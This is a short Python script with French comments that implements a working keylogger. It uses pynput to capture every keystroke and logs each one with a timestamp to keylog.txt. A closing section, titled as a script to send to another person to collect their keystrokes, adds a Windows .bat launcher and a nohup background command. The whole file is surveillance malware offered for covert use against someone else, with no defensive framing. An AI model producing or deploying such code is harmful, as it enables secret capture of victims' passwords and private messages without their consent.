### Récupération des frappes du clavier

from pynput.keyboard import Listener # Listener est un écouteur, écouter le clavier
import logging # permet d'écrire des logs

logging.basicConfig(filename=('keylog.txt'), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def onPress(key):
    logging.info(str(key))     # Produit le message qui va s'afficher là-haut

with Listener(on_press=onPress) as listener :
    listener.join()


### Petit script pour envoyer à une personne pour récupérer les frappes du clavier

#run.bat
# @echo off
# "C:\Python39\python.exe" "keyLogger.pyw"
# pause

# nohup python3 keyLogger.py &